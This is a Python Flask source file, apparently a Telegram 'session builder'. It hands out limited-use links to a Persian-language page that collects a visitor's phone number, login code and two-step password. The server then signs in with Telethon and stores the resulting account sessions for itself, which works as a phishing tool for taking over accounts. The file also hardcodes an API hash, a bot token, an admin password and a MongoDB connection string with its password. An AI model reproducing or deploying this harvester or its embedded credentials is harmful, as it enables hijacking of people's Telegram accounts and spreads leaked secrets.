# ================================================================
# Telegram Session Builder — FULL FINAL COMPLETE VERSION
# Anti-Sleep + Admin Panel + MongoDB + Telethon
# By: Tiam
# ================================================================

import os
import asyncio
import threading
import secrets
import time
import shutil
from datetime import datetime

import requests
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient

# ===================== CONFIG ===================================
CONFIG = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis",
}

os.makedirs(CONFIG["save_path"], exist_ok=True)

# ===================== MongoDB ==================================
mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)

db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links

# ===================== Flask ====================================
app = Flask(__name__)

# ===================== ASYNC LOOP ================================
loop = asyncio.new_event_loop()

def start_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================
def gen_token():
    return secrets.token_urlsafe(10)

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def delete_session(phone):
    path = os.path.join(CONFIG["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

# ===================== USER HTML ================================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Telegram Session Builder</title>
<style>
body {background:#020617;color:white;font-family:tahoma}
.box {width:360px;margin:120px auto;padding:25px;background:#0f172a;border-radius:14px;text-align:center}
input,button {padding:12px;margin-top:10px;border-radius:8px;border:none;width:100%}
button {background:#6366f1;color:white}
</style>
</head>
<body>
<div class="box">
<h3>ساخت سشن تلگرام</h3>
<input id="phone" placeholder="شماره تلفن">
<button onclick="sendPhone()">دریافت کد</button>

<div id="s2" style="display:none">
<input id="code" placeholder="کد تلگرام">
<button onclick="sendCode()">تأیید کد</button>
</div>

<div id="s3" style="display:none">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
<button onclick="sendPassword()">تأیید رمز</button>
</div>

<div id="done" style="display:none">
<h3>✅ سشن ساخته شد</h3>
</div>
</div>

<script>
let phone="";
function sendPhone(){
    phone=document.getElementById("phone").value;
    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({phone})})
    .then(r=>r.json()).then(d=>{
        alert(d.message);
        if(d.status==="ok") s2.style.display="block";
    });
}
function sendCode(){
    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({phone,code:code.value})})
    .then(r=>r.json()).then(d=>{
        if(d.status==="2fa") s3.style.display="block";
        if(d.status==="ok") done.style.display="block";
    });
}
function sendPassword(){
    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({phone,password:password.value})})
    .then(r=>r.json()).then(d=>{
        if(d.status==="ok") done.style.display="block";
    });
}
setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== ADMIN HTML ================================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<style>
body {background:#020617;color:white;font-family:tahoma}
button,input {padding:8px;border-radius:6px;margin-top:6px}
</style>
</head>
<body>
<h2>پنل ادمین</h2>
<form method="post">
<input name="max" type="number" placeholder="تعداد استفاده" required>
<button>ساخت لینک</button>
</form>
<hr>
{% for l in links %}
<div>
{{ l.token }} | {{ l.used }}/{{ l.max }}
<button onclick="navigator.clipboard.writeText('{{ base_url }}/?key={{ l.token }}')">
کپی لینک
</button>
</div>
{% endfor %}
</body>
</html>
"""

# ===================== Routes ===================================
@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک نامعتبر یا منقضی شده"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

# ===================== TELETHON ================================
clients = {}

async def create_client(phone):
    client = TelegramClient(
        os.path.join(CONFIG["save_path"], phone),
        CONFIG["api_id"],
        CONFIG["api_hash"]
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok", message="کد ارسال شد")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    code = request.json["code"]
    c = clients.get(phone)
    try:
        async def job():
            await c.sign_in(phone, code)
            sessions_col.insert_one({"phone": phone})
        run_async(job())
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = normalize_phone(request.json["phone"])
    pwd = request.json["password"]
    c = clients.get(phone)
    async def job():
        await c.sign_in(password=pwd)
        sessions_col.insert_one({"phone": phone})
    run_async(job())
    return jsonify(status="ok")

# ===================== ADMIN ROUTE ==============================
@app.route("/admin", methods=["GET","POST"])
def admin():
    auth = request.authorization
    if not auth or auth.username!=CONFIG["admin_username"] or auth.password!=CONFIG["admin_password"]:
        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
    if request.method=="POST":
        links_col.insert_one({
            "token": gen_token(),
            "max": int(request.form["max"]),
            "used": 0,
            "created": datetime.utcnow()
        })
        return redirect("/admin")
    return render_template_string(
        ADMIN_HTML,
        links=list(links_col.find()),
        base_url=CONFIG["base_url"]
    )

# ===================== KEEP ALIVE ================================
def self_ping():
    while True:
        try:
            requests.get(CONFIG["base_url"] + "/ping", timeout=10)
        except:
            pass
        time.sleep(230)

def telegram_ping():
    while True:
        try:
            requests.get(
                f"https://api.telegram.org/bot{CONFIG['fake_bot_token']}/getMe",
                timeout=10
            )
        except:
            pass
        time.sleep(240)

threading.Thread(target=self_ping, daemon=True).start()
threading.Thread(target=telegram_ping, daemon=True).start()

# ===================== RUN ======================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
